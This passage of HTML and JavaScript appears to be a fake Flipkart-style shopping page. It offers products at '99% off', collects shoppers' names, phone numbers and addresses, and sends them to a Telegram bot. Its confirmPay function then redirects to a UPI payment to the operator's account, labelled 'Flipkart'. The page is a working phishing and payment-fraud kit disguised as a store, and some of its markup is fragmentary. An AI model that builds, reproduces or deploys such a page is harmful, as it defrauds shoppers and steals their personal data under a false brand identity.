    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; overflow-x: hidden; }
        .fk-blue { background-color: #2874f0; }
        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; font-weight: bold; }
        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; font-weight: bold; }
        .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
        .line-input { width: 100%; border-bottom: 2px solid #ccc; padding: 12px 0; outline: none; background: transparent; }
        
        /* Home Banner Swiper */
        .home-swiper { width: 100%; height: 180px; }
        .home-swiper img { width: 100%; height: 100%; object-fit: cover; }
        
        /* Detail Page Image Stack */
        .detail-swiper { height: 320px; width: 100%; background: white; }
        .detail-swiper img { width: 100%; height: 100%; object-fit: contain; }
        .full-stack img { width: 100%; height: auto; margin-bottom: 4px; border-bottom: 1px solid #eee; }
    </style>

        <header class="fk-blue py-3 px-4 flex items-center justify-between sticky top-0 z-[100]">

                <i class="fa-solid fa-magnifying-glass text-xs"></i>
                <input type="text" id="searchInput" oninput="searchProduct()" placeholder="Search for products, brands and more" class="text-sm w-full outline-none text-black">

        </div>

        <div class="swiper home-swiper">
            <div class="swiper-wrapper">

    <div id="page-detail" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto">

            <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
            <span class="font-bold">Details</span>
        </nav>

        <div class="swiper detail-swiper"><div class="swiper-wrapper" id="swiper-images"></div><div class="swiper-pagination"></div></div>

        <div class="p-4 bg-white border-b">
            <p id="det-name" class="text-lg font-medium text-gray-800 leading-tight"></p>
            <div class="flex items-baseline gap-2 mt-2">
                <span id="det-price" class="text-3xl font-bold"></span>
                <span class="text-green-600 font-bold text-sm">99% off</span>
            </div>
        </div>

        <div class="p-4 bg-white mt-2 border-b">

            </div>
        </div>

        <div class="mt-2 bg-white">
            <p class="p-4 text-xs font-bold text-gray-400 uppercase">Product Description Photos</p>
            <div id="full-stack-images" class="full-stack"></div>
        </div>

        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220] p-2 gap-2">
            <button class="w-1/2 font-bold text-sm border rounded">ADD TO CART</button>
            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm rounded">CONTINUE</button>
        </div>
    </div>

    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
        <nav class="fk-blue p-4 text-white flex items-center gap-4">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
            <span class="font-medium">Add Delivery Address</span>
        </nav>
        <div class="p-6 space-y-6">
            <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
            <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
            
            <div class="relative">
                <input type="number" id="uPin" placeholder="Pincode (Required)*" class="line-input" oninput="fetchPin(this.value)">
                <span id="load" class="absolute right-0 bottom-3 text-xs text-blue-500 hidden italic">Locating...</span>
            </div>
            
            <div class="flex gap-4">
                <input type="text" id="uCity" placeholder="City" class="line-input w-1/2 bg-gray-100" readonly>
                <input type="text" id="uState" placeholder="State" class="line-input w-1/2 bg-gray-100" readonly>
            </div>
            
            <input id="uAdd" placeholder="House No, Building Name*" class="line-input">
            <button onclick="goToPayment()" class="w-full btn-orange py-4 rounded shadow-lg uppercase">Save and Continue</button>
        </div>
    </div>

    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">

                        </div>

        let sel = null; let swpHome, swpDet;

        function init() {
            const grid = document.getElementById('main-grid');
            products.forEach(p => {
                grid.innerHTML += `<div class="bg-white p-3 border shadow-sm" onclick="openProduct(${p.id})"><img src="${p.imgs[0]}" class="h-32 mx-auto object-contain"><p class="text-xs mt-2 line-clamp-2">${p.name}</p><p class="font-bold">‚Çπ${p.price}</p><p class="text-green-600 text-[10px] font-bold">99% Off</p></div>`;
            });
            swpHome = new Swiper(".home-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: { delay: 3000 } });
        }

        function showPage(id) {
            ['page-home', 'page-detail', 'page-address', 'page-payment'].forEach(p => document.getElementById(p).classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
            window.scrollTo(0,0);
        }

        function openProduct(id) {
            sel = products.find(p => p.id === id);
            document.getElementById('det-name').innerText = sel.name;
            document.getElementById('det-price').innerText = "‚Çπ" + sel.price;
            
            const sW = document.getElementById('swiper-images');
            const fS = document.getElementById('full-stack-images');
            sW.innerHTML = ''; fS.innerHTML = '';

            sel.imgs.forEach(url => {
                sW.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
                fS.innerHTML += `<img src="${url}">`;
            });

            showPage('page-detail');
            if(swpDet) swpDet.destroy();
            swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
        }

        async function fetchPin(pin) {
            if(pin.length === 6) {
                document.getElementById('load').classList.remove('hidden');
                try {
                    const r = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
                    const d = await r.json();
                    if(d[0].Status === "Success") {
                        document.getElementById('uCity').value = d[0].PostOffice[0].District;
                        document.getElementById('uState').value = d[0].PostOffice[0].State;
                    }
                } catch (e) {}
                document.getElementById('load').classList.add('hidden');
            }
        }

        function goToPayment() {
            if(document.getElementById('uName').value && document.getElementById('uPhone').value) {
                showPage('page-payment');
            } else alert("Fill all details");
        }

        function confirmPay() {
            const n = document.getElementById('uName').value;
            const msg = `üî• *ORDER ALERT* üî•\n\nItem: ${sel.name}\nPrice: ‚Çπ${sel.price}\n\nüë§ Name: ${n}\nüìû Phone: ${document.getElementById('uPhone').value}\nüìç City: ${document.getElementById('uCity').value}`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
        }
